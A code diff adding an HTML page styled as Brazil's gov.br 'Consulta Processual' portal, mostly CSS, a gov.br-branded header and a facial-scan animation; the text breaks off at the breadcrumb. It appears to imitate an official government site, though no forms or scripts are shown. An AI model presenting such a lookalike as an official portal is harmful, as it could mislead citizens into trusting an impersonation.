@@ -1,0 +1,1877 @@
+<html lang="pt-br"><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/content/location/location.js" id="eppiocemhmnlbhjplcgkofciiegomcon"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/extend-native-history-api.js"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/requests.js"></script><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Consulta Processual - Portal do Governo Federal</title>
+    <script src="https://cdn.tailwindcss.com"></script><style type="text/css" id="operaUserStyle"></style>
+    <link href="https://fonts.cdnfonts.com/css/rawline" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        /* Design System do Governo Federal - Cores Oficiais */
+        :root {
+            --blue-warm-vivid-70: #005EA2;
+            --blue-warm-vivid-60: #0F73B3;
+            --blue-warm-vivid-50: #2491C4;
+            --blue-warm-vivid-40: #58B4D4;
+            --blue-warm-vivid-30: #8DD5E4;
+            --blue-warm-vivid-20: #C2F0F4;
+            --blue-warm-vivid-10: #E7F6F8;
+            --blue-warm-vivid-5: #F0FCFF;
+            --gray-90: #1B1B1B;
+            --gray-80: #2D2E2F;
+            --gray-70: #454647;
+            --gray-60: #5C5D5F;
+            --gray-50: #757575;
+            --gray-40: #919395;
+            --gray-30: #ADADAF;
+            --gray-20: #C9CACB;
+            --gray-10: #E4E4E6;
+            --gray-5: #F1F1F3;
+            --gray-2: #FAFAFA;
+            --green-vivid-50: #00A91C;
+            --red-vivid-50: #E52207;
+            --gold-vivid-20: #FFBE2E;
+            --orange-vivid-50: #FA9441;
+            --pure-white: #FFFFFF;
+            --pure-black: #000000;
+            /* Tipografia Rawline */
+            --font-family-base: 'Rawline', 'Raleway', sans-serif;
+            --font-size-scale-base: 14px;
+            --font-lineheight-medium: 1.45;
+            --font-lineheight-low: 1.15;
+            /* Sombras e Elevação */
+            --shadow-1: 0 1px 2px 0 rgba(0, 0, 0, 0.1);
+            --shadow-2: 0 1px 3px 0 rgba(0, 0, 0, 0.1), 0 1px 2px 0 rgba(0, 0, 0, 0.06);
+            --shadow-3: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+            --shadow-4: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
+            --shadow-5: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
+        }
+
+        * {
+            font-family: var(--font-family-base);
+        }
+
+        body {
+            font-size: var(--font-size-scale-base);
+            line-height: var(--font-lineheight-medium);
+            color: var(--gray-80);
+            background-color: var(--gray-2);
+        }
+
+        /* Cores personalizadas do Design System */
+        .bg-gov-blue { background-color: var(--blue-warm-vivid-70); }
+        .bg-gov-blue-light { background-color: var(--blue-warm-vivid-10); }
+        .bg-gov-blue-lighter { background-color: var(--blue-warm-vivid-5); }
+        .text-gov-blue { color: var(--blue-warm-vivid-70); }
+        .text-gov-blue-dark { color: var(--blue-warm-vivid-60); }
+        .border-gov-blue { border-color: var(--blue-warm-vivid-70); }
+        .hover\:bg-gov-blue-dark:hover { background-color: var(--blue-warm-vivid-60); }
+        .bg-gov-green { background-color: var(--green-vivid-50); }
+        .text-gov-green { color: var(--green-vivid-50); }
+        .bg-gov-red { background-color: var(--red-vivid-50); }
+        .text-gov-red { color: var(--red-vivid-50); }
+        .bg-gov-gold { background-color: var(--gold-vivid-20); }
+        .text-gov-gold { color: var(--gold-vivid-20); }
+        .bg-gov-gray-light { background-color: var(--gray-5); }
+        .bg-gov-gray { background-color: var(--gray-10); }
+        .text-gov-gray { color: var(--gray-60); }
+        .text-gov-gray-dark { color: var(--gray-80); }
+
+        /* Sombras do Design System */
+        .shadow-gov-1 { box-shadow: var(--shadow-1); }
+        .shadow-gov-2 { box-shadow: var(--shadow-2); }
+        .shadow-gov-3 { box-shadow: var(--shadow-3); }
+        .shadow-gov-4 { box-shadow: var(--shadow-4); }
+        .shadow-gov-5 { box-shadow: var(--shadow-5); }
+
+        /* Animações sofisticadas */
+        .fade-in {
+            animation: fadeIn 0.6s ease-in-out;
+        }
+
+        .slide-up {
+            animation: slideUp 0.8s ease-out;
+        }
+
+        .scale-in {
+            animation: scaleIn 0.5s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes slideUp {
+            from { 
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to { 
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes scaleIn {
+            from { 
+                opacity: 0;
+                transform: scale(0.9);
+            }
+            to { 
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        /* Animação de escaneamento facial */
+        @keyframes scan {
+            0% { transform: translateY(-100%); }
+            50% { transform: translateY(100%); }
+            100% { transform: translateY(-100%); }
+        }
+
+        .scan-line {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 5px;
+            background: linear-gradient(to right, transparent, var(--blue-warm-vivid-70), transparent);
+            animation: scan 2s infinite linear;
+        }
+
+        /* Elemento flutuante de Libras */
+        .libras-widget {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            z-index: 1000;
+            background: var(--blue-warm-vivid-70);
+            color: white;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            box-shadow: var(--shadow-4);
+            transition: all 0.3s ease;
+            animation: pulse 2s infinite;
+            border: 3px solid white;
+        }
+
+        .libras-widget:hover {
+            background: var(--blue-warm-vivid-60);
+            transform: scale(1.1);
+            box-shadow: var(--shadow-5);
+            animation-play-state: paused;
+        }
+
+        .libras-widget.active {
+            background: var(--green-vivid-50);
+            animation: none;
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(0, 94, 162, 0.7); }
+            70% { box-shadow: 0 0 0 10px rgba(0, 94, 162, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(0, 94, 162, 0); }
+        }
+
+        /* Tooltip do widget */
+        .libras-tooltip {
+            position: absolute;
+            bottom: 70px;
+            right: 0;
+            background: var(--gray-90);
+            color: white;
+            padding: 8px 12px;
+            border-radius: 6px;
+            font-size: 12px;
+            white-space: nowrap;
+            opacity: 0;
+            transform: translateY(10px);
+            transition: all 0.3s ease;
+            pointer-events: none;
+        }
+
+        .libras-tooltip::after {
+            content: '';
+            position: absolute;
+            top: 100%;
+            right: 20px;
+            border: 5px solid transparent;
+            border-top-color: var(--gray-90);
+        }
+
+        .libras-widget:hover .libras-tooltip {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        /* Modal de Libras */
+        .libras-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 1001;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            backdrop-filter: blur(5px);
+        }
+
+        .libras-modal-content {
+            background: white;
+            border-radius: 16px;
+            padding: 32px;
+            max-width: 600px;
+            width: 90%;
+            max-height: 80vh;
+            overflow-y: auto;
+            box-shadow: var(--shadow-5);
+            animation: scaleIn 0.3s ease-out;
+            position: relative;
+        }
+
+        /* Controles de acessibilidade */
+        .accessibility-controls {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 16px;
+            margin-top: 24px;
+        }
+
+        .accessibility-control {
+            background: var(--gray-5);
+            border: 2px solid var(--gray-10);
+            border-radius: 12px;
+            padding: 16px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+        }
+
+        .accessibility-control:hover {
+            border-color: var(--blue-warm-vivid-70);
+            background: var(--blue-warm-vivid-5);
+        }
+
+        .accessibility-control.active {
+            border-color: var(--green-vivid-50);
+            background: var(--green-vivid-50);
+            color: white;
+        }
+
+        .accessibility-control.active .control-icon {
+            color: white;
+        }
+
+        .control-icon {
+            font-size: 24px;
+            color: var(--blue-warm-vivid-70);
+            margin-bottom: 8px;
+        }
+
+        .control-title {
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+
+        .control-description {
+            font-size: 14px;
+            opacity: 0.8;
+        }
+
+        /* Slider para controles */
+        .accessibility-slider {
+            width: 100%;
+            margin: 12px 0;
+            -webkit-appearance: none;
+            appearance: none;
+            height: 6px;
+            border-radius: 3px;
+            background: var(--gray-20);
+            outline: none;
+        }
+
+        .accessibility-slider::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            appearance: none;
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            background: var(--blue-warm-vivid-70);
+            cursor: pointer;
+            box-shadow: var(--shadow-2);
+        }
+
+        .accessibility-slider::-moz-range-thumb {
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            background: var(--blue-warm-vivid-70);
+            cursor: pointer;
+            border: none;
+            box-shadow: var(--shadow-2);
+        }
+
+        /* Estados de acessibilidade */
+        body.high-contrast {
+            filter: contrast(150%) brightness(1.2);
+        }
+
+        body.large-text {
+            font-size: 18px;
+        }
+
+        body.large-text h1 { font-size: 3.5rem; }
+        body.large-text h2 { font-size: 2.5rem; }
+        body.large-text h3 { font-size: 2rem; }
+        body.large-text .btn-gov { font-size: 18px; padding: 16px 32px; }
+        body.large-text .input-gov { font-size: 18px; padding: 16px 20px; }
+
+        body.reduced-motion * {
+            animation-duration: 0.01ms !important;
+            animation-iteration-count: 1 !important;
+            transition-duration: 0.01ms !important;
+        }
+
+        /* VLibras integration */
+        .vlibras-container {
+            background: var(--blue-warm-vivid-10);
+            border: 2px solid var(--blue-warm-vivid-70);
+            border-radius: 12px;
+            padding: 20px;
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .vlibras-avatar {
+            width: 120px;
+            height: 120px;
+            background: var(--blue-warm-vivid-70);
+            border-radius: 50%;
+            margin: 0 auto 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 48px;
+        }
+
+        /* Estilos para opções desabilitadas */
+        .disabled-option {
+            opacity: 0.5;
+            cursor: not-allowed;
+            pointer-events: none;
+        }
+
+        /* Gradientes sofisticados */
+        .gradient-gov {
+            background: linear-gradient(135deg, var(--blue-warm-vivid-70) 0%, var(--blue-warm-vivid-50) 100%);
+        }
+
+        .gradient-gov-light {
+            background: linear-gradient(135deg, var(--blue-warm-vivid-10) 0%, var(--blue-warm-vivid-5) 100%);
+        }
+
+        /* Micro-interações */
+        .btn-gov {
+            background: var(--blue-warm-vivid-70);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 12px 24px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: var(--shadow-2);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-gov:hover {
+            background: var(--blue-warm-vivid-60);
+            transform: translateY(-2px);
+            box-shadow: var(--shadow-4);
+        }
+
+        .btn-gov:active {
+            transform: translateY(0);
+            box-shadow: var(--shadow-2);
+        }
+
+        .btn-gov::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: left 0.5s;
+        }
+
+        .btn-gov:hover::before {
+            left: 100%;
+        }
+
+        /* Cards sofisticados */
+        .card-gov {
+            background: white;
+            border-radius: 12px;
+            padding: 24px;
+            box-shadow: var(--shadow-2);
+            transition: all 0.3s ease;
+            border: 1px solid var(--gray-10);
+        }
+
+        .card-gov:hover {
+            box-shadow: var(--shadow-4);
+            transform: translateY(-4px);
+        }
+
+        /* Header governamental */
+        .gov-header {
+            background: var(--blue-warm-vivid-70);
+            color: white;
+            padding: 16px 0;
+            box-shadow: var(--shadow-3);
+        }
+
+        .gov-logo {
+            height: 40px;
+            width: auto;
+        }
+
+        /* Breadcrumb governamental */
+        .gov-breadcrumb {
+            background: var(--blue-warm-vivid-10);
+            padding: 12px 0;
+            border-bottom: 1px solid var(--blue-warm-vivid-20);
+        }
+
+        /* Inputs sofisticados */
+        .input-gov {
+            border: 2px solid var(--gray-20);
+            border-radius: 8px;
+            padding: 12px 16px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            background: white;
+        }
+
+        .input-gov:focus {
+            outline: none;
+            border-color: var(--blue-warm-vivid-70);
+            box-shadow: 0 0 0 3px rgba(0, 94, 162, 0.1);
+        }
+
+        /* Select customizado */
+        .select-gov {
+            border: 2px solid var(--gray-20);
+            border-radius: 8px;
+            padding: 12px 16px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            background: white;
+            cursor: pointer;
+        }
+
+        .select-gov:focus {
+            outline: none;
+            border-color: var(--blue-warm-vivid-70);
+            box-shadow: 0 0 0 3px rgba(0, 94, 162, 0.1);
+        }
+
+        /* Loading sofisticado */
+        .loading-spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid var(--blue-warm-vivid-20);
+            border-top: 4px solid var(--blue-warm-vivid-70);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Responsividade aprimorada */
+        @media (max-width: 768px) {
+            .libras-widget {
+                width: 50px;
+                height: 50px;
+                bottom: 15px;
+                right: 15px;
+            }
+
+            .card-gov {
+                padding: 16px;
+            }
+
+            .btn-gov {
+                padding: 10px 20px;
+                font-size: 14px;
+            }
+        }
+        
+        
+/* CSS para o efeito de loading */
+.loading-dots {
+    display: inline-block;
+    width: 40px;
+    text-align: left;
+    animation: loading 1.4s infinite;
+    font-weight: bold;
+    color: #666;
+}
+
+@keyframes loading {
+    0%, 20% {
+        content: '.';
+    }
+    40% {
+        content: '..';
+    }
+    60%, 100% {
+        content: '...';
+    }
+}
+
+/* Alternativa com pontos que piscam */
+.loading-dots::after {
+    content: '';
+    display: inline-block;
+    width: 0;
+    animation: dots 1.5s steps(4, end) infinite;
+}
+
+@keyframes dots {
+    0%, 20% {
+        content: '';
+    }
+    40% {
+        content: '.';
+    }
+    60% {
+        content: '..';
+    }
+    80%, 100% {
+        content: '...';
+    }
+}
+    </style>
+<style>*, ::before, ::after{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }::backdrop{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }/* ! tailwindcss v3.4.17 | MIT License | https://tailwindcss.com */*,::after,::before{box-sizing:border-box;border-width:0;border-style:solid;border-color:#e5e7eb}::after,::before{--tw-content:''}:host,html{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;tab-size:4;font-family:ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";font-feature-settings:normal;font-variation-settings:normal;-webkit-tap-highlight-color:transparent}body{margin:0;line-height:inherit}hr{height:0;color:inherit;border-top-width:1px}abbr:where([title]){-webkit-text-decoration:underline dotted;text-decoration:underline dotted}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}a{color:inherit;text-decoration:inherit}b,strong{font-weight:bolder}code,kbd,pre,samp{font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;font-feature-settings:normal;font-variation-settings:normal;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}table{text-indent:0;border-color:inherit;border-collapse:collapse}button,input,optgroup,select,textarea{font-family:inherit;font-feature-settings:inherit;font-variation-settings:inherit;font-size:100%;font-weight:inherit;line-height:inherit;letter-spacing:inherit;color:inherit;margin:0;padding:0}button,select{text-transform:none}button,input:where([type=button]),input:where([type=reset]),input:where([type=submit]){-webkit-appearance:button;background-color:transparent;background-image:none}:-moz-focusring{outline:auto}:-moz-ui-invalid{box-shadow:none}progress{vertical-align:baseline}::-webkit-inner-spin-button,::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}blockquote,dd,dl,figure,h1,h2,h3,h4,h5,h6,hr,p,pre{margin:0}fieldset{margin:0;padding:0}legend{padding:0}menu,ol,ul{list-style:none;margin:0;padding:0}dialog{padding:0}textarea{resize:vertical}input::placeholder,textarea::placeholder{opacity:1;color:#9ca3af}[role=button],button{cursor:pointer}:disabled{cursor:default}audio,canvas,embed,iframe,img,object,svg,video{display:block;vertical-align:middle}img,video{max-width:100%;height:auto}[hidden]:where(:not([hidden=until-found])){display:none}.container{width:100%}@media (min-width: 640px){.container{max-width:640px}}@media (min-width: 768px){.container{max-width:768px}}@media (min-width: 1024px){.container{max-width:1024px}}@media (min-width: 1280px){.container{max-width:1280px}}@media (min-width: 1536px){.container{max-width:1536px}}.sr-only{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0, 0, 0, 0);white-space:nowrap;border-width:0}.fixed{position:fixed}.absolute{position:absolute}.relative{position:relative}.inset-0{inset:0px}.bottom-4{bottom:1rem}.left-4{left:1rem}.right-4{right:1rem}.z-50{z-index:50}.mx-auto{margin-left:auto;margin-right:auto}.mb-1{margin-bottom:0.25rem}.mb-12{margin-bottom:3rem}.mb-2{margin-bottom:0.5rem}.mb-3{margin-bottom:0.75rem}.mb-4{margin-bottom:1rem}.mb-6{margin-bottom:1.5rem}.mb-8{margin-bottom:2rem}.ml-auto{margin-left:auto}.mr-1{margin-right:0.25rem}.mr-2{margin-right:0.5rem}.mr-3{margin-right:0.75rem}.mr-4{margin-right:1rem}.mt-0\.5{margin-top:0.125rem}.mt-1{margin-top:0.25rem}.mt-2{margin-top:0.5rem}.mt-3{margin-top:0.75rem}.mt-4{margin-top:1rem}.mt-6{margin-top:1.5rem}.mt-8{margin-top:2rem}.block{display:block}.flex{display:flex}.grid{display:grid}.hidden{display:none}.h-12{height:3rem}.h-16{height:4rem}.h-20{height:5rem}.h-3\/4{height:75%}.h-6{height:1.5rem}.h-80{height:20rem}.h-full{height:100%}.min-h-screen{min-height:100vh}.w-12{width:3rem}.w-16{width:4rem}.w-20{width:5rem}.w-3\/4{width:75%}.w-6{width:1.5rem}.w-full{width:100%}.max-w-2xl{max-width:42rem}.max-w-3xl{max-width:48rem}.max-w-4xl{max-width:56rem}.max-w-md{max-width:28rem}.flex-1{flex:1 1 0%}.transform{transform:translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}@keyframes pulse{50%{opacity:.5}}.animate-pulse{animation:pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite}.cursor-pointer{cursor:pointer}.grid-cols-1{grid-template-columns:repeat(1, minmax(0, 1fr))}.flex-col{flex-direction:column}.items-start{align-items:flex-start}.items-center{align-items:center}.justify-center{justify-content:center}.justify-between{justify-content:space-between}.gap-2{gap:0.5rem}.gap-4{gap:1rem}.gap-6{gap:1.5rem}.gap-8{gap:2rem}.space-x-2 > :not([hidden]) ~ :not([hidden]){--tw-space-x-reverse:0;margin-right:calc(0.5rem * var(--tw-space-x-reverse));margin-left:calc(0.5rem * calc(1 - var(--tw-space-x-reverse)))}.space-x-4 > :not([hidden]) ~ :not([hidden]){--tw-space-x-reverse:0;margin-right:calc(1rem * var(--tw-space-x-reverse));margin-left:calc(1rem * calc(1 - var(--tw-space-x-reverse)))}.space-x-6 > :not([hidden]) ~ :not([hidden]){--tw-space-x-reverse:0;margin-right:calc(1.5rem * var(--tw-space-x-reverse));margin-left:calc(1.5rem * calc(1 - var(--tw-space-x-reverse)))}.space-y-2 > :not([hidden]) ~ :not([hidden]){--tw-space-y-reverse:0;margin-top:calc(0.5rem * calc(1 - var(--tw-space-y-reverse)));margin-bottom:calc(0.5rem * var(--tw-space-y-reverse))}.space-y-3 > :not([hidden]) ~ :not([hidden]){--tw-space-y-reverse:0;margin-top:calc(0.75rem * calc(1 - var(--tw-space-y-reverse)));margin-bottom:calc(0.75rem * var(--tw-space-y-reverse))}.space-y-4 > :not([hidden]) ~ :not([hidden]){--tw-space-y-reverse:0;margin-top:calc(1rem * calc(1 - var(--tw-space-y-reverse)));margin-bottom:calc(1rem * var(--tw-space-y-reverse))}.space-y-8 > :not([hidden]) ~ :not([hidden]){--tw-space-y-reverse:0;margin-top:calc(2rem * calc(1 - var(--tw-space-y-reverse)));margin-bottom:calc(2rem * var(--tw-space-y-reverse))}.overflow-hidden{overflow:hidden}.whitespace-nowrap{white-space:nowrap}.rounded{border-radius:0.25rem}.rounded-full{border-radius:9999px}.rounded-lg{border-radius:0.5rem}.rounded-r-lg{border-top-right-radius:0.5rem;border-bottom-right-radius:0.5rem}.border{border-width:1px}.border-2{border-width:2px}.border-4{border-width:4px}.border-l-4{border-left-width:4px}.border-t{border-top-width:1px}.border-gray-200{--tw-border-opacity:1;border-color:rgb(229 231 235 / var(--tw-border-opacity, 1))}.border-gray-300{--tw-border-opacity:1;border-color:rgb(209 213 219 / var(--tw-border-opacity, 1))}.border-green-200{--tw-border-opacity:1;border-color:rgb(187 247 208 / var(--tw-border-opacity, 1))}.border-white{--tw-border-opacity:1;border-color:rgb(255 255 255 / var(--tw-border-opacity, 1))}.border-opacity-20{--tw-border-opacity:0.2}.bg-black{--tw-bg-opacity:1;background-color:rgb(0 0 0 / var(--tw-bg-opacity, 1))}.bg-gray-100{--tw-bg-opacity:1;background-color:rgb(243 244 246 / var(--tw-bg-opacity, 1))}.bg-gray-200{--tw-bg-opacity:1;background-color:rgb(229 231 235 / var(--tw-bg-opacity, 1))}.bg-gray-50{--tw-bg-opacity:1;background-color:rgb(249 250 251 / var(--tw-bg-opacity, 1))}.bg-gray-900{--tw-bg-opacity:1;background-color:rgb(17 24 39 / var(--tw-bg-opacity, 1))}.bg-green-100{--tw-bg-opacity:1;background-color:rgb(220 252 231 / var(--tw-bg-opacity, 1))}.bg-green-50{--tw-bg-opacity:1;background-color:rgb(240 253 244 / var(--tw-bg-opacity, 1))}.bg-white{--tw-bg-opacity:1;background-color:rgb(255 255 255 / var(--tw-bg-opacity, 1))}.bg-opacity-10{--tw-bg-opacity:0.1}.bg-opacity-50{--tw-bg-opacity:0.5}.bg-opacity-95{--tw-bg-opacity:0.95}.object-cover{object-fit:cover}.p-2{padding:0.5rem}.p-3{padding:0.75rem}.p-4{padding:1rem}.p-6{padding:1.5rem}.px-2{padding-left:0.5rem;padding-right:0.5rem}.px-4{padding-left:1rem;padding-right:1rem}.py-1{padding-top:0.25rem;padding-bottom:0.25rem}.py-12{padding-top:3rem;padding-bottom:3rem}.py-16{padding-top:4rem;padding-bottom:4rem}.py-4{padding-top:1rem;padding-bottom:1rem}.py-8{padding-top:2rem;padding-bottom:2rem}.pt-6{padding-top:1.5rem}.pt-8{padding-top:2rem}.text-left{text-align:left}.text-center{text-align:center}.font-mono{font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}.text-2xl{font-size:1.5rem;line-height:2rem}.text-3xl{font-size:1.875rem;line-height:2.25rem}.text-4xl{font-size:2.25rem;line-height:2.5rem}.text-lg{font-size:1.125rem;line-height:1.75rem}.text-sm{font-size:0.875rem;line-height:1.25rem}.text-xl{font-size:1.25rem;line-height:1.75rem}.text-xs{font-size:0.75rem;line-height:1rem}.font-bold{font-weight:700}.font-semibold{font-weight:600}.uppercase{text-transform:uppercase}.tracking-wide{letter-spacing:0.025em}.text-gray-500{--tw-text-opacity:1;color:rgb(107 114 128 / var(--tw-text-opacity, 1))}.text-gray-600{--tw-text-opacity:1;color:rgb(75 85 99 / var(--tw-text-opacity, 1))}.text-green-600{--tw-text-opacity:1;color:rgb(22 163 74 / var(--tw-text-opacity, 1))}.text-green-800{--tw-text-opacity:1;color:rgb(22 101 52 / var(--tw-text-opacity, 1))}.text-white{--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity, 1))}.opacity-75{opacity:0.75}.opacity-90{opacity:0.9}.backdrop-blur-sm{--tw-backdrop-blur:blur(4px);-webkit-backdrop-filter:var(--tw-backdrop-blur) var(--tw-backdrop-brightness) var(--tw-backdrop-contrast) var(--tw-backdrop-grayscale) var(--tw-backdrop-hue-rotate) var(--tw-backdrop-invert) var(--tw-backdrop-opacity) var(--tw-backdrop-saturate) var(--tw-backdrop-sepia);backdrop-filter:var(--tw-backdrop-blur) var(--tw-backdrop-brightness) var(--tw-backdrop-contrast) var(--tw-backdrop-grayscale) var(--tw-backdrop-hue-rotate) var(--tw-backdrop-invert) var(--tw-backdrop-opacity) var(--tw-backdrop-saturate) var(--tw-backdrop-sepia)}.transition-colors{transition-property:color, background-color, border-color, fill, stroke, -webkit-text-decoration-color;transition-property:color, background-color, border-color, text-decoration-color, fill, stroke;transition-property:color, background-color, border-color, text-decoration-color, fill, stroke, -webkit-text-decoration-color;transition-timing-function:cubic-bezier(0.4, 0, 0.2, 1);transition-duration:150ms}.hover\:bg-white:hover{--tw-bg-opacity:1;background-color:rgb(255 255 255 / var(--tw-bg-opacity, 1))}.hover\:bg-opacity-20:hover{--tw-bg-opacity:0.2}.hover\:underline:hover{-webkit-text-decoration-line:underline;text-decoration-line:underline}@media (min-width: 768px){.md\:block{display:block}.md\:grid-cols-2{grid-template-columns:repeat(2, minmax(0, 1fr))}.md\:grid-cols-3{grid-template-columns:repeat(3, minmax(0, 1fr))}.md\:grid-cols-4{grid-template-columns:repeat(4, minmax(0, 1fr))}.md\:flex-row{flex-direction:row}.md\:text-5xl{font-size:3rem;line-height:1}}</style></head>
+
+<body __processed_9ff2dec8-69a2-4f30-847d-9a4277282e52__="true">
+    <!-- Header Governamental -->
+    <header class="gov-header">
+        <div class="container mx-auto px-4">
+            <div class="flex items-center justify-between">
+                <div class="flex items-center space-x-4">
+                    <svg class="gov-logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60" fill="currentColor">
+                        <text x="10" y="35" font-size="24" font-weight="bold">gov.br</text>
+                    </svg>
+                    <div class="hidden md:block">
+                        <h1 class="text-xl font-semibold">Portal do Governo Federal</h1>
+                        <p class="text-sm opacity-90">Transparência e Eficiência</p>
+                    </div>
+                </div>
+                <div class="flex items-center space-x-4">
+                    <button class="p-2 hover:bg-white hover:bg-opacity-20 rounded-lg transition-colors">
+                        <i class="fas fa-search text-lg"></i>
+                    </button>
+                    <button class="p-2 hover:bg-white hover:bg-opacity-20 rounded-lg transition-colors">
+                        <i class="fas fa-user text-lg"></i>
+                    </button>
+                    <button class="p-2 hover:bg-white hover:bg-opacity-20 rounded-lg transition-colors">
+                        <i class="fas fa-bars text-lg"></i>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Breadcrumb -->
